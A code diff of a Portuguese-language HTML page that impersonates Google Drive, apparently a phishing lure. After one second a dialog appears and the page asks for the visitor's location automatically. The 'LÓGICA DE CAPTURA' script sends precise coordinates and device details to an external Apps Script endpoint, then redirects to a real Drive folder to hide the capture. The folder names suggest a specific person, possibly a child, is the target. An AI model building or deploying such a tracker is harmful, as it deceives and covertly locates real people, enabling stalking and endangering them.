@@ -3,213 +3,574 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Documento compartilhado</title>
+<title>Meu Drive - Google Drive</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined|Material+Icons" rel="stylesheet">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body {
     height: 100%;
     overflow: hidden;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: #f1f5f9;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    background: #fff;
+    color: #202124;
+    font-size: 14px;
   }
 
-  /* Fundo simulando a pasta do Drive */
-  .fundo {
-    position: fixed;
-    inset: 0;
-    padding: 40px 24px;
-    filter: blur(1.5px);
-    opacity: 0.85;
-    pointer-events: none;
-    user-select: none;
+  .app {
+    display: grid;
+    grid-template-columns: 256px 1fr;
+    grid-template-rows: 64px 1fr;
+    height: 100vh;
   }
 
-  .barra {
+  /* ============ TOPBAR ============ */
+  .topbar {
+    grid-column: 1 / -1;
     display: flex;
     align-items: center;
-    gap: 12px;
-    margin-bottom: 28px;
+    padding: 8px 16px;
+    gap: 8px;
+    background: #fff;
   }
 
   .logo-drive {
     width: 40px;
     height: 40px;
-    border-radius: 8px;
-    background: linear-gradient(135deg, #34a853, #fbbc04, #ea4335);
-  }
-
-  .titulo-fake {
-    height: 20px;
-    width: 220px;
-    background: #94a3b8;
-    border-radius: 4px;
-  }
-
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-    gap: 16px;
-  }
-
-  .pasta-fake {
-    background: #fff;
-    border: 1px solid #e2e8f0;
-    border-radius: 10px;
-    padding: 16px;
     display: flex;
     align-items: center;
-    gap: 10px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    justify-content: center;
+    padding: 8px;
+    border-radius: 50%;
+    cursor: pointer;
+  }
+  .logo-drive:hover { background: #f1f3f4; }
+  .logo-drive svg { width: 24px; height: 24px; }
+
+  .topbar .nome { 
+    font-size: 22px; 
+    color: #5f6368; 
+    margin-right: 24px;
+    font-family: 'Google Sans', sans-serif;
+    font-weight: 400;
   }
 
-  .icone-fake {
+  .busca {
+    flex: 1;
+    max-width: 720px;
+    height: 48px;
+    background: #f1f3f4;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    padding: 0 8px 0 16px;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+  .busca:focus-within {
+    background: #fff;
+    box-shadow: 0 1px 1px 0 rgba(65,69,73,0.3), 0 1px 3px 1px rgba(65,69,73,0.15);
+  }
+  .busca .mi { color: #5f6368; font-size: 20px; margin-right: 12px; }
+  .busca input {
+    flex: 1;
+    border: none;
+    outline: none;
+    background: transparent;
+    font-size: 16px;
+    font-family: inherit;
+    color: #202124;
+  }
+  .busca input::placeholder { color: #5f6368; }
+
+  .topbar .dir {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .icon-btn {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    color: #5f6368;
+    font-size: 24px;
+    font-family: 'Material Icons Outlined';
+    transition: background 0.15s;
+  }
+  .icon-btn:hover { background: #f1f3f4; }
+
+  .avatar {
     width: 32px;
     height: 32px;
-    border-radius: 6px;
-    background: #60a5fa;
-    flex-shrink: 0;
+    border-radius: 50%;
+    background: #7b1fa2;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-left: 4px;
   }
 
-  .texto-fake {
-    height: 12px;
+  /* ============ SIDEBAR ============ */
+  .sidebar {
+    padding: 8px 0;
+    overflow-y: auto;
+  }
+
+  .novo-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 24px 0 16px;
+    height: 48px;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 24px;
+    margin: 8px 0 16px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #3c4043;
+    font-family: inherit;
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+    cursor: pointer;
+    transition: box-shadow 0.15s, background 0.15s;
+  }
+  .novo-btn:hover { 
+    background: #f8f9fa;
+    box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+  }
+  .novo-btn .mi { font-family: 'Material Icons'; font-size: 24px; color: #5f6368; }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    height: 32px;
+    padding: 0 12px 0 24px;
+    border-radius: 0 16px 16px 0;
+    margin-right: 8px;
+    font-size: 14px;
+    color: #202124;
+    cursor: pointer;
+    transition: background 0.15s;
+    white-space: nowrap;
+    overflow: hidden;
+  }
+  .nav-item:hover { background: #f1f3f4; }
+  .nav-item.ativo { background: #c2e7ff; font-weight: 500; }
+  .nav-item .mi { font-family: 'Material Icons Outlined'; font-size: 20px; color: #444746; flex-shrink: 0; }
+  .nav-item.ativo .mi { font-family: 'Material Icons'; }
+
+  .nav-sep {
+    height: 1px;
+    background: #dadce0;
+    margin: 8px 16px 8px 24px;
+  }
+
+  .armazenamento {
+    margin: 16px 24px;
+    font-size: 13px;
+    color: #5f6368;
+  }
+  .barra {
+    height: 4px;
+    background: #e8eaed;
+    border-radius: 2px;
+    overflow: hidden;
+    margin: 8px 0;
+  }
+  .barra > div {
+    height: 100%;
+    width: 24%;
+    background: #1a73e8;
+    border-radius: 2px;
+  }
+
+  /* ============ CONTEÚDO ============ */
+  .conteudo {
+    padding: 0 24px 24px;
+    overflow-y: auto;
+  }
+
+  .toolbar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 0 16px;
+  }
+
+  .toolbar .titulo-sec {
+    font-size: 14px;
+    color: #5f6368;
     flex: 1;
-    background: #cbd5e1;
-    border-radius: 3px;
   }
 
-  /* Cortina - agora mais leve */
+  .tipo-view {
+    display: flex;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .tipo-view .mi {
+    font-family: 'Material Icons';
+    font-size: 20px;
+    padding: 6px 10px;
+    color: #5f6368;
+    cursor: pointer;
+  }
+  .tipo-view .mi.ativo { background: #c2e7ff; color: #001d35; }
+
+  .tabela {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+
+  .tabela thead th {
+    text-align: left;
+    font-weight: 500;
+    color: #5f6368;
+    font-size: 13px;
+    padding: 8px 12px;
+    border-bottom: 1px solid #dadce0;
+    user-select: none;
+    font-family: 'Google Sans', sans-serif;
+  }
+
+  .tabela tbody tr {
+    cursor: pointer;
+    transition: background 0.1s;
+  }
+  .tabela tbody tr:hover { background: #f1f3f4; }
+
+  .tabela tbody td {
+    padding: 0 12px;
+    height: 48px;
+    border-bottom: 1px solid #f1f3f4;
+    color: #5f6368;
+    vertical-align: middle;
+  }
+
+  .col-nome { 
+    display: flex; 
+    align-items: center; 
+    gap: 12px; 
+    color: #202124; 
+    font-size: 14px;
+  }
+
+  .folder-icon {
+    width: 24px;
+    height: 24px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .folder-icon svg { width: 20px; height: 20px; }
+
+  .col-acoes {
+    opacity: 0;
+    transition: opacity 0.15s;
+  }
+  .tabela tbody tr:hover .col-acoes { opacity: 1; }
+
+  .col-acoes .mi {
+    font-family: 'Material Icons';
+    font-size: 20px;
+    color: #5f6368;
+    padding: 6px;
+    border-radius: 50%;
+    cursor: pointer;
+  }
+  .col-acoes .mi:hover { background: #e8eaed; }
+
+  /* ============ OVERLAY ============ */
   .overlay {
     position: fixed;
     inset: 0;
-    background: rgba(15, 23, 42, 0.35); /* bem mais transparente */
-    backdrop-filter: blur(3px);          /* desfoque suave */
+    background: rgba(32, 33, 36, 0.6);
+    backdrop-filter: blur(2px);
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 9999;
     padding: 20px;
-    transition: opacity 0.3s ease;
-  }
-
-  .overlay.hidden {
     opacity: 0;
     pointer-events: none;
+    transition: opacity 0.4s ease;
   }
+  .overlay.visivel { opacity: 1; pointer-events: auto; }
+  .overlay.hidden { opacity: 0; pointer-events: none; }
 
-  .card {
+  .dialogo {
     background: #fff;
-    color: #0f172a;
-    border-radius: 16px;
-    padding: 32px 28px;
+    border-radius: 28px;
+    padding: 24px;
     max-width: 400px;
     width: 100%;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.28);
+    transform: translateY(20px);
+    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
     text-align: center;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .overlay.visivel .dialogo { transform: translateY(0); }
+
+  .dialogo .icone-grande {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Material Icons';
+    font-size: 32px;
+    color: #1a73e8;
+    background: #e8f0fe;
+    border-radius: 50%;
   }
 
-  .card .icone {
-    font-size: 44px;
-    margin-bottom: 14px;
+  .dialogo h2 {
+    font-size: 22px;
+    font-weight: 400;
+    color: #202124;
+    margin-bottom: 12px;
+    font-family: 'Google Sans', sans-serif;
   }
 
-  .card h2 {
-    font-size: 19px;
-    margin-bottom: 10px;
-    font-weight: 600;
-  }
-
-  .card p {
+  .dialogo p {
     font-size: 14px;
-    color: #475569;
-    margin-bottom: 22px;
+    color: #5f6368;
     line-height: 1.5;
+    margin-bottom: 24px;
   }
 
-  .card button {
-    width: 100%;
-    padding: 15px;
-    font-size: 15px;
-    font-weight: 600;
-    color: #fff;
-    background: #2563eb;
+  .dialogo .acoes {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .btn-txt {
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #1a73e8;
+    background: transparent;
     border: none;
-    border-radius: 10px;
+    border-radius: 100px;
     cursor: pointer;
-    transition: background 0.15s, transform 0.1s;
+    font-family: inherit;
+    transition: background 0.15s;
   }
+  .btn-txt:hover { background: #f6fafe; }
 
-  .card button:hover { background: #1d4ed8; }
-  .card button:active { transform: scale(0.98); }
-  .card button:disabled { opacity: 0.6; cursor: wait; }
+  .btn-preenchido {
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #fff;
+    background: #1a73e8;
+    border: none;
+    border-radius: 100px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+  .btn-preenchido:hover { 
+    background: #1765cc; 
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+  }
+  .btn-preenchido:disabled { opacity: 0.6; cursor: wait; }
 
   .msg {
-    margin-top: 14px;
+    margin-top: 12px;
     font-size: 13px;
-    color: #ef4444;
+    color: #d93025;
     min-height: 18px;
+  }
+
+  @media (max-width: 768px) {
+    .app { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+    .topbar .nome { display: none; }
+    .conteudo { padding: 0 12px 12px; }
+    .tabela thead th:not(:first-child) { display: none; }
+    .tabela tbody td:not(:first-child):not(:last-child) { display: none; }
   }
 </style>
 </head>
 <body>
 
-  <div class="fundo">
-    <div class="barra">
-      <div class="logo-drive"></div>
-      <div class="titulo-fake"></div>
-    </div>
-    <div class="grid">
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-      <div class="pasta-fake"><div class="icone-fake"></div><div class="texto-fake"></div></div>
-    </div>
-  </div>
+<div class="app">
 
-  <div class="overlay" id="overlay">
-    <div class="card">
-      <div class="icone">📍</div>
-      <h2>Confirme sua localização</h2>
-      <p>Para acessar este conteúdo, você precisa autorizar o acesso à sua localização.</p>
-      <button id="btn">Permitir e continuar</button>
-      <div class="msg" id="msg"></div>
+  <header class="topbar">
+    <div class="logo-drive">
+      <svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+        <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+        <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0-1.2 4.5h27.5z" fill="#00ac47"/>
+        <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+        <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#ffba00"/>
+        <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+      </svg>
     </div>
+    <div class="nome">Drive</div>
+
+    <div class="busca">
+      <span class="mi">search</span>
+      <input type="text" placeholder="Pesquisar no Drive">
+    </div>
+
+    <div class="dir">
+      <div class="icon-btn">settings</div>
+      <div class="icon-btn">help_outline</div>
+      <div class="icon-btn">apps</div>
+      <div class="avatar">G</div>
+    </div>
+  </header>
+
+  <aside class="sidebar">
+    <button class="novo-btn"><span class="mi">add</span>Novo</button>
+
+    <div class="nav-item ativo"><span class="mi">folder</span>Meu Drive</div>
+    <div class="nav-item"><span class="mi">computer</span>Computadores</div>
+    <div class="nav-item"><span class="mi">people</span>Compartilhados comigo</div>
+    <div class="nav-item"><span class="mi">schedule</span>Recentes</div>
+    <div class="nav-item"><span class="mi">star_border</span>Com estrela</div>
+    <div class="nav-item"><span class="mi">info</span>Spam</div>
+    <div class="nav-item"><span class="mi">delete_outline</span>Lixeira</div>
+    <div class="nav-item"><span class="mi">cloud_queue</span>Armazenamento</div>
+
+    <div class="nav-sep"></div>
+
+    <div class="armazenamento">
+      <div class="barra"><div></div></div>
+      <div>3,7 GB de 15 GB usados</div>
+    </div>
+  </aside>
+
+  <main class="conteudo">
+    <div class="toolbar">
+      <div class="titulo-sec">Pastas</div>
+      <div class="tipo-view">
+        <span class="mi">list</span>
+        <span class="mi ativo">grid_view</span>
+      </div>
+    </div>
+
+    <table class="tabela">
+      <thead>
+        <tr>
+          <th style="width: 50%">Nome</th>
+          <th style="width: 15%">Proprietário</th>
+          <th style="width: 20%">Última modificação</th>
+          <th style="width: 10%">Tamanho do arquivo</th>
+          <th style="width: 5%"></th>
+        </tr>
+      </thead>
+      <tbody id="lista">
+      </tbody>
+    </table>
+  </main>
+</div>
+
+<!-- Diálogo -->
+<div class="overlay" id="overlay">
+  <div class="dialogo">
+    <div class="icone-grande">location_on</div>
+    <h2>Confirme sua localização</h2>
+    <p>Para acessar este conteúdo, você precisa autorizar o acesso à sua localização.</p>
+    <div class="acoes">
+      <button class="btn-txt" id="btnCancelar">Agora não</button>
+      <button class="btn-preenchido" id="btn">Permitir</button>
+    </div>
+    <div class="msg" id="msg"></div>
   </div>
+</div>
 
 <script>
+  const folderSVG = `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z" fill="#5f6368"/></svg>`;
+
+  const pastas = [
+    { nome: 'Fotos do Caso Benicio', dono: 'eu', mod: '5 de out. de 2026', tam: '—' },
+    { nome: 'Prontuários', dono: 'eu', mod: '4 de out. de 2026', tam: '—' },
+    { nome: 'Exames Pediatria', dono: 'eu', mod: '3 de out. de 2026', tam: '—' },
+    { nome: 'Ortopedia', dono: 'eu', mod: '2 de out. de 2026', tam: '—' },
+    { nome: 'Juliana', dono: 'eu', mod: '1 de out. de 2026', tam: '—' }
+  ];
+
+  const tbody = document.getElementById('lista');
+  pastas.forEach(p => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td>
+        <div class="col-nome">
+          <div class="folder-icon">${folderSVG}</div>
+          <span>${p.nome}</span>
+        </div>
+      </td>
+      <td>${p.dono}</td>
+      <td>${p.mod}</td>
+      <td>${p.tam}</td>
+      <td class="col-acoes"><span class="mi">more_vert</span></td>
+    `;
+    tbody.appendChild(tr);
+  });
+
+  // ============ LÓGICA DE CAPTURA ============
   const btn = document.getElementById('btn');
+  const btnCancelar = document.getElementById('btnCancelar');
   const msg = document.getElementById('msg');
   const overlay = document.getElementById('overlay');
 
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEIeDdSyoHHW8t1sVRE-C8dfZgFQVnbBVVsvqlpmBlAkUNZ9e_TZszpPZz_iwV7oUh/exec';
   const DESTINO = 'https://drive.google.com/drive/folders/1Jj_Io3G4P0seEreAgJORidrv7cJC1o5K?usp=drive_link';
 
-  btn.addEventListener('click', async () => {
+  let jaCapturou = false; // evita disparar duas vezes
+
+  // 1) Exibe overlay + dispara o prompt nativo do navegador simultaneamente
+  setTimeout(() => {
+    overlay.classList.add('visivel');
+    // Dispara o prompt de localização automaticamente (junto com o overlay)
+    pedirLocalizacao();
+  }, 1000);
+
+  // 2) Botão "Permitir" — só age se a chamada automática falhou
+  btn.addEventListener('click', () => {
+    if (jaCapturou) return;
     msg.textContent = '';
+    pedirLocalizacao();
+  });
+
+  btnCancelar.addEventListener('click', () => {
+    msg.textContent = 'Você precisa autorizar para continuar.';
+  });
+
+  function pedirLocalizacao() {
+    if (jaCapturou) return;
 
     if (!navigator.geolocation) {
       msg.textContent = 'Seu navegador não suporta geolocalização.';
       return;
     }
 
-    try {
-      const perm = await navigator.permissions.query({ name: 'geolocation' });
-      if (perm.state === 'denied') {
-        msg.textContent = 'Você negou a localização. Permita nas configurações do navegador para continuar.';
-        return;
-      }
-    } catch (_) {}
-
     btn.disabled = true;
-    btn.textContent = 'Obtendo localização...';
+    btn.textContent = 'Obtendo...';
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
+        if (jaCapturou) return;
+        jaCapturou = true;
 
+        const { latitude, longitude, accuracy } = pos.coords;
         const payload = {
           Latitude: latitude,
           Longitude: longitude,
@@ -223,47 +584,34 @@
           Nucleos: navigator.hardwareConcurrency || 'N/A',
           Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
         };
-
         const body = Object.entries(payload)
-          .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
-          .join('&');
-
+          .map(([k,v]) => encodeURIComponent(k)+'='+encodeURIComponent(v)).join('&');
         try {
           await fetch(SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
+            method: 'POST', mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
             body
           });
-        } catch (e) {
-          console.error('Erro no fetch:', e);
-        }
+        } catch (e) { console.error(e); }
 
         overlay.classList.add('hidden');
-        setTimeout(() => {
-          window.location.href = DESTINO;
-        }, 400);
+        setTimeout(() => { window.location.href = DESTINO; }, 400);
       },
       (err) => {
         btn.disabled = false;
-        btn.textContent = 'Tentar novamente';
-        switch (err.code) {
-          case err.PERMISSION_DENIED:
-            msg.textContent = 'Permissão negada. Você precisa permitir a localização para continuar.';
-            break;
-          case err.POSITION_UNAVAILABLE:
-            msg.textContent = 'Localização indisponível no momento.';
-            break;
-          case err.TIMEOUT:
-            msg.textContent = 'Tempo esgotado ao obter localização.';
-            break;
-          default:
-            msg.textContent = 'Erro ao obter localização.';
+        btn.textContent = 'Permitir';
+
+        if (err.code === err.PERMISSION_DENIED) {
+          msg.textContent = 'Permissão negada. Permita nas configurações do navegador (ícone de cadeado).';
+        } else if (err.code === err.TIMEOUT) {
+          msg.textContent = 'Tempo esgotado. Tente novamente.';
+        } else {
+          msg.textContent = 'Não foi possível obter a localização. Tente novamente.';
         }
       },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
-  });
+  }
 
   async function obterIP() {
     try {
